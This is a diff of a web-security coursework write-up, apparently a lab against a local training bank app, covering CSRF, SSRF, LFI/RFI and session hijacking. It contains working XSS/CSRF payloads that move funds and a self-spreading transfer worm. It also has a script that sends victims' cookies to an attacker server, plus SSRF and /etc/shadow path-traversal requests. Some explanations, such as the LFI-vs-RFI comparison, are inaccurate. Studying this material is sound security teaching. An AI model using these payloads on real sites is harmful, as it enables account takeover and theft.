@@ -7,28 +7,27 @@ __Q__ 1. Briefly explain what CSRF/XSRF is in your own words (outline the roles 
 
 __Solution__
 
-- Cross-site-request-forgery (CSRF)- is an attack where the malicious website exploits trust between the web browser and the authenticated user's website which is vulnerable
-- Unauthorized requests or commands are run on behalf of victim on the vulnerable website
--  Assume a vulnerable website that allows to run commands(like funds transfer), containing a url for that funds transfer. So when the user hits `transfer funds` with appropriate parameters, request gets executed succussfully
+- Cross-site-request-forgery (CSRF)- is an attack where a malicious website exploits trust between the web browser and the authenticated user's website that is vulnerable.
+- Unauthorized requests or commands are run on behalf of the victim on a vulnerable website.
+-  Assume a vulnerable website that allows executing commands (like funds transfer) containing a URL for that fund's transfer. So when the user hits `transfer funds` with appropriate parameters, the request gets executed successfully.
 
-- Steps invloved:
-    - Setup a malcious website
-    - Create a script or source(like, `img` tags, `iframe`) that executes the request to transfer funds.
-    - Allow the  authenticated victim to access the malicous website
-    - Send the fund transfer request . (Since the victim is authenticated and the URL/script is crafted to transfer funds, cookies stored on victim's broswer also be sent)
-    - Request gets sent on behalf of malicous users so the  request procesess successfully.
+- Steps involved:
+    - Setup a malicious website.
+    - craft a script or source (like, `img` tags, `iframe`) that executes a request to transfer funds.
+    - Allow the  authenticated victim to access the malicious website.
+    - Send the fund transfer request. (Since the victim is authenticated and the URL/script is crafted to transfer funds, cookies stored on the victim's browser also be sent).
+    - Request is sent on behalf of malicious users so the request is executed successfully.
 
 
 #### Task 2
 
 __Q: What is the difference between XSS and CSRF/XSRF from their execution perspective?__  
-__Solution:__ If a website is vulnerable to stored XSS, execution of commands on behalf of victim is easy and does'nt require to setup a malicous website. In case of Cross-site request forgery,, the excution requires, the authentication victim from vulnerable website to visit the malicouis website setup by the attacker in order to execute the commands/requests.
-
+__Solution:__ Both of these are client-side attacks. But, Cross-site scripting (or XSS) allows an attacker to execute arbitrary JavaScript within the browser of a victim user. Where as Cross-site request forgery (or CSRF) allows an attacker to trick a victim user to perform actions that they do not intend to.
 
 #### Task 3
 
 __Q: Briefly explain why your bank is theoretically vulnerable to CSRF/XSRF attack!__  
-__Solution:__ After examining the web request, on `Transfer Funds` page , the website doesn't seem to send  any unique identifier or tokens , that identify the request as being originated from the same domain, or performed by the actual user.
+__Solution:__ After examining the web request from the `Transfer Funds` page, the web application doesn't send a unique identifier or token, that identifies the request being originated from the same domain or performed by the actual user.
 
 ![funds_transfer](images/task2/funds_transfer.PNG)
 
@@ -37,28 +36,179 @@ __Solution:__ After examining the web request, on `Transfer Funds` page , the we
 
 __Assume that you are a valid customer of your bank. Show how you can use XSRF
 to transfer money from another account to your account.__
+__Solution:__ In this attack, XSS vulnerability on the Account Details page is leveraged to perform CSRF.
+Follow the tutorial to install Nginx
+https://www.digitalocean.com/community/tutorials/how-to-install-linux-nginx-mysql-php-lemp-stack-on-debian-8
 
+After installation, start the Nginx server using 
+```sudo systemctl start nginx ```
+create a file ```error.html``` with the following script in your Nginx server folder.
 
+```
+<html>
+<body>
+<script>
+const queryString = window.location.search;
+console.log(queryString);
+const urlParams = new URLSearchParams(queryString);
+const accountNo = urlParams.get('x');
+
+function getURL()
+{
+
+const url = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc=14314312&amount=1.95&remark=&htbtransfer=Transfer";
+http://localhost/htdocs/index.php?page=htbtransfer&srcacc=173105291&dstbank=41131337&dstacc=11111111&amount=1&remark=&htbtransfer=Transfer 
+window.open(url, "_blank");
+}
+</script>
+							
+<html>
+<body>
+We are very sorry for the inconvenience, you had an error while during the last transaction, please click the button bellow to claim your refund plus 1 cent gift.
+<button onclick="getURL()"> Proceed </button>
+
+</body>
+</html>
+
+```
+Three payloads were used due to the character limitations of the remark field.
+Go to Transfer Funds page and send the below three payloads in remark field to victim account from the attacker account.
+
+Payload 1
+```script
+    <script>var x = document.getElementsByName("account")[0].value</script> 
+```
+Payload 2 
+```script
+    <script>function y(){window.open("http://localhost:81/error.html?x="+x, "_blank");}</script> 
+```
+Payload3
+```script
+    <a onclick="y()">Error please click here!!</a>
+```
+Once the payloads are transferred victim can see a ``` Error please click here!!!``` link in the remark field on the Account details page.
+Assuming the victim is innocent and clicks the link.
+The page will be redirected to the error.html which is up and running in the attacker server (Nginx).
+
+If the victim clicks on the 'proceed' button, the funds will be transferred to the attacker's account, and the page is redirected to the bank web application.
 
 
 #### Task 5.
 __5. Enhance your last attack such that it automatically spreads to other accounts and transfers your money from them too. Briefly explain your attack.__
 
+To perform this attack we have to make some assumptions to overcome some limitations,
+The assumption is that a bank account number is an eight-digit number with the same number in every digit place like 11111111,22222222,33333333....,99999999.
+- Approaches and their limitations:
+    - Approach 1: Bruteforce. to generate all account numbers and send the payload.
+    - Limitation: Bruteforce is computationally costly.
+    - Approach 2: Acquiring account number from the Account Details page.
+    - Limitation: There might be a scenario where Account A has only B's details on its account details page and B also has only A's details in this case we are not able to spread the attack to other accounts.
+
+Because of these limitations for the demonstration of the attack, we made the assumption.
+
+To perfom the attack please repeat the process explained in excercise 1.d replacing the cookie.html code with the code given below.
+
+```
+<html>
+<body >
+We are very sorry for the inconvenience, you had an error while during the last transaction, please click the button bellow to claim your refund plus 1 cent gift.
+<button onclick="getURL()"> Proceed </button>
+<div style="display:none" id="images"> </div>
+</body>
+
+<script>
+const queryString = window.location.search;
+console.log(queryString);
+const urlParams = new URLSearchParams(queryString);
+const accountNo = urlParams.get('x');
+console.log(accountNo);
+
+const allAccounts = [11111111,22222222,33333333,44444444,55555555,66666666,77777777,88888888,99999999];
+
+function getURL()
+{
+
+allAccounts.forEach(function(destAccount){
+	var varName = new Image();
+	varName.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc="+destAccount+"&amount=1.1&remark=%3Cscript%3Evar+x+%3D+document.getElementsByName%28%22account%22%29%5B0%5D.value%3C%2Fscript%3E&htbtransfer=Transfer";
+	document.getElementById('images').appendChild(varName);
+	
+	var funcName = new Image();
+	funcName.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc="+destAccount+"&amount=1.2&remark=%3Cscript%3Efunction+y%28%29%7Bwindow.open%28%22http%3A%2F%2Flocalhost%2Fhtdocs%2Ferror.html%3Fx%3D%22%2Bx%2C+%22_blank%22%29%3B%7D%3C%2Fscript%3E&htbtransfer=Transfer";
+	document.getElementById('images').appendChild(funcName);
+	
+	var executeFunction = new Image();
+	executeFunction.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc="+destAccount+"&amount=1.3&remark=%3Ca+onclick%3D%22y%28%29%22%3EError+please+click+here%21%21%3C%2Fa%3E++&htbtransfer=Transfer";
+	document.getElementById('images').appendChild(executeFunction);
+
+		
+	});
+
+const url = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc=14314312&amount=1.95&remark=&htbtransfer=Transfer";
+
+window.open(url, "_blank");
+
+}
+
+</script>
+
+</html>
+```
+when the victim clicks the ``` Error please click here!!!``` link the attack will spread to all accounts on the bank server.
 
 <br></br>
 <hr></hr>
-
 <br></br>
+
 ### Exercise 2: Server-Side Request Forgery(SSRF)
 
 __1. Briefly explain in your own words what is SSRF vulnerability and common SSRF attacks and what are the common SSRF defences circumventing__
 
-__Solution__ SSRF(Server side request forgery) is a web server vulnerability where an attacker tricks the sever to execute a request. with a specially crafted request, one can control the server to request a URL, usually crafted with a publicly accessible URL, thus giving the partial or full control on server requests.
+__Solution__ SSRF(Server-side request forgery) is a web server vulnerability where an attacker tricks the server to execute a request. with a specially crafted request, one can control the vulnerable application itself or other back-end systems that the server can communicate with. The malicious URL usually crafted using a publicly accessible URL, thus giving partial or full control on server requests.
+
+Common SSRF attacks
+SSRF attacks can affect the server itself or the other backend systems that have a relation with the server
+SSRF attacks against the server itself
+In an SSRF attack against the server itself,  the attacker tricks the application to make an HTTP request to the server itself via its loopback network interface. 
+Consider an example where a user makes a POST request to fetch a  product. 
+the request looks like below
+``` 
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+```
+This can be manipulated to 
+```  
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+stockApi=http://localhost/admin
+```
+which returns the admin contents to the user.  
+
+SSRF attacks against other back-end systems
+This type of attack can be performed when the application vulnerable server can interact with other back-end systems that are not directly reachable by users. 
+
+This attack can exploit  by requesting 
+``` stockApi=http://192.164.1.22/admin ```
+
+- Common SSRF defenses:
+    - blacklist-based input filters
+        The application should block the requests containing localhost 127.0.0.1 or other sensitive keywords like admin.
+    - whitelist-based input filters
+        By allowing input that matches, begins with, or contains
+    - Whitelist Domains in DNS
+    - Do Not Send Raw Responses
+    - Sanitize and Validate Inputs
+    - Enable Authentication on All Services
+
+
 
 __2. What is the difference between SSRF and CSRF/XSRF from their execution
 perspective?__
 
-__Solution:__ CSRF targets the user, to trick or executes malicious links/requests,and send it to server on behalf of them, where as SSRF invloves specifically targeting the server, that is vulnerable in handling user requests. Although in both cases, its the server that is vulnerable, the victim is different in CSRF and SSRF attacks.  
+__Solution:__ CSRF targets the user, to trick or executes malicious links/requests, and send them to the server on behalf of them, whereas SSRF involves specifically targeting the server, which is vulnerable in handling user requests. Although in both cases, the server is vulnerable, the victim is different in CSRF and SSRF attacks.  
 
 
 ### Exercise 3: Local File Inclusion (LFI)
@@ -66,9 +216,9 @@ __Solution:__ CSRF targets the user, to trick or executes malicious links/reques
 __1. Briefly explain what is a Local File Inclusion (LFI) vulnerability? By using a simple
 example, describe how do LFIs work and how to avoid this vulnerability? Show
 a vulnerable code and apply your patch to it.__
-__Solution:__  Local File Inclusion (LFI) ia web vulnerability, where an attacker tricks the web application to dynamically load files from from the web server that are available locally.
+__Solution:__  Local File Inclusion (LFI) is a web vulnerability, where an attacker tricks the web application to dynamically load files from the webserver that are available locally.
 
-*Example:* When an application receives an unsantitized user input,  and processed, which exposes local files because of the input that directly constructs the file path, which is included in response
+*Example:* When an application receives an unsanitized user input,  and processed, which exposes local files because of the input that directly constructs the file path, which is included in a response
 
 sample vulnerable code
 
@@ -87,60 +237,62 @@ How it works:
 
 - The application uses file path as an input
 - user input is treated as trusted and safe
-- A local file can be inlcuded as a result of user specified input to the file include
-- Application returns the file contnets as response
+- A local file can be included as a result of user-specified input to the file include
+- Application returns the file contents as a response
 
 ![Example diagram]()
 
 
 **Avoiding the Vulnerability**
-    - Common and effective solution is to avoid allowing user submitted input to the application API.
-    - An application can also have allowed list of files to include (whitelisting fioles and directories that can be included), any other input or file names can be rejected.
+    - ID assignation: Saving file paths in a database with an ID for every single one, this way user can only see the ID without viewing or altering the path.
+    - Whitelisting: An application can allow verified and secured whitelist files and ignore other input or file names.
 
-
-
+- **A vulnerable code**
+    ```php
+     $local_file = $_REQUEST["page"];
+     include ($local_file. '.php')
+      ```
 
 - **Fix: Whitelisting file**
     ```php
-     $allowed_files = array('index','transfer', 'accounts'); //list of files that are allowed to be included 
+     $allowed_files = array('index','transfer','accounts'); //list of files that are allowed to be included 
      $local_file = $_REQUEST["page"];
-     if(in_array($_GET['file'], $allowed_files)) { //check if the requested file is in allowed array list
-        include ($_GET['file']. '.php')
+     if(in_array($local_file, $allowed_files)) { //check if the requested file is in allowed array list
+        include ($local_file. '.php')
     }
     ```
 
-    > It is also best, that none of the  allowedd_files can be modified by attacker, epecially with file uploads where the attacker has control over file names
+    > It is also best, that none of the  allowed_files can be modified by attacker, epecially with file uploads where the attacker has control over file names.
 
 
 __2. How do you identify and exploit LFI? Describe it with a simple example.__
 
-- Look for page includes or file names as URL parameters like'
+- Look for the page that includes file names or pages as URL parameters like
     ```php
          http://www.vbank.com/file.php?file=transfer.php 
     ```
-- change file by changing the file inlcude or file path URL
-- Traverse through directory to look for local files and observe the  response from the application
+- change file by changing the file include or file path URL
+- Traverse through the directory to look for local files and observe the  response from the application
  
 - example..
     ```javascript
         http://www.vbank.com/file.php?file=../etc/shadow  //does'nt work
     ```
-
     ```javascript
         http://www.vbank.com/file.php?file=../../etc/shadow // does'nt work
     ```
     ```javascript
         http://www.vbank.com/file.php?file=../../../etc/shadow // shows the shadow file
     ```
-- If the file path is true and the application does;nt filter and file is availbale in local to the server, contents can be displayed on the browser as a response
-- The lack of input validation and filtering for files allow to read aribitary file contents.
+- If the file path is true and the application doesn't filter and the file is available local to the server, contents can be displayed on the browser as a response
+- The lack of input validation and filtering for files allows reading file contents.
 
 
 __3. Briefly explain what is Remote File Inclusion (RFI) and how can you minimise the risk of RFI attacks? And LFI vs. RFI?__  
 __Solution:__  
-- Remote File Inclusion (RFI) web vulnerability where user editable input is used to include other files in execution flow of the application script.
-- If that input is not sanitized, that can lead to arbitary files being inlcuded by the attacker.
-- In PHP, `include`,`include_once`, `require`, `require_once` lead to such vulnerabilities.
+- Remote File Inclusion (RFI) web vulnerability where arbitary input is allowed in file include request that dynamically refere external scripts.
+- If that input is not sanitized, that can lead to the execution of remote files from a remote URL located within a different domain.
+- In PHP, using the unsanitized input in functions like `include`,`include_once`, `require`, `require_once` lead to such vulnerabilities.
 - Typical Vulnerable code.
 
     ```php
@@ -148,12 +300,15 @@ __Solution:__
         echo "<br><br>";
         include $_REQUEST["file"];
     ```
+- Minimizing risks:
+    - Sanitize user-provided inputs in (GET/POST parameters, URL parameters and HTTP header values).
+    - Build a whitelist and allow request execution only with the requests with those files.
+    - For RFI to work, `allow_url_include` must be turned `On` in PHP configuration (located in `php.ini`). This can be turned `Off` to minimize the risk of fetching remote files. Usually on default installation this is turned `Off`.    
 
 - **LFI Vs RFI**
-    - Every RFI is a LFI, the only difference is that in RFI, the attacker can supply his own file to the target application and execute whereas, in LFI, user supplied file/input is limited to the application server local.
+    - LFI and RFI are almost similar, both the attacks result in the upload of malware to the server to gain unauthorized access to sensitive data.
+In the RFI the attacker uses remote files whereas in LFI local files are used to carry out the attack. 
 
-- For RFI to work, `allow_url_include` must be turned `On` in PHP configuration (located in `php.ini`). This can be turned `Off` to minimize the risk of fetching remote files. Usially on default installation this is turned `Off`.
-- Another way to minize the risk, is to whitelist files and directories, and sanitize user supplied input just like remote File Inclusion.
 
 
 ### Exercise 4: Session Hijacking
@@ -161,41 +316,42 @@ __Solution:__
 
 __1. Install a webserver on your machine. Use it to write a script that will read the
 information required to hijack a session. Briefly describe your script.__
-__Solution 1:__ 
-    - Installed Python  and run the webserver module
-```bash
-    $ python3 -m http.server
-        Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
-```  
-- Initiate multiple funds transfer with following remarks
-> Multiple transfers are required as the remarks input is limited to 100 characters after encoding the contnets in it. For that reason, **payload is staged**.
-- Remarks in transfer 1:
-```javascript
-<script>var c=document.cookie;</script>
+
+__Solution:__ 
+    - Follow the tutorial to install Nginx
+https://www.digitalocean.com/community/tutorials/how-to-install-linux-nginx-mysql-php-lemp-stack-on-debian-8
+
+After installation, start the Nginx server using 
+```sudo systemctl start nginx ```
+
+Creat a file cookie.html in your Nginx server folder with the code
+
+``` 
+<html>
+<body>
+<script>
+const queryString = window.location.search;
+console.log(queryString);
+const urlParams = new URLSearchParams(queryString);
+const cookie = urlParams.get('c');
+const Http = new XMLHttpRequest();
+// Give your Ip machine Ip address where the server is running
+var sendCookie='http://192.168.59.139:82/'+cookie; 
+Http.open("GET", sendCookie);
+Http.send();
+
+</script>
+							
+<html>
+<body>
+
+</body>
+</html>
+
 ```
-- Remarks in transfer 2:
-```javascript
-<script>const Http = new XMLHttpRequest();</script>
-```
-- Remarks in transfer 3:
-```javascript
-<script>const u='http://192.168.37.128:8000/'+x;</script>
-```
-- Remarks in ransfer 4:
-```javascript
-<script>Http.open("GET", url);Http.send();</script>
-```
-- The above scripts is an ajax call to attacker server running on `192.168.37.128:8000`, that sends the cookie value `c`
-    The above remarks make up the following
-    ```javascript
-    <script>
-        var c=document.cookie;  //store cookie in variable c
-        const Http = new XMLHttpRequest();
-        var u='http://192.168.37.128:8000/'+x; // aoppend cookie value to url
-        Http.open("GET", url);
-        Http.send();
-    </script>
-    ```
+send the following payload to victim using XSS (Transfer)
+
+
 
 - The request for the above script can be seen in attacker's server logs
     ```bash
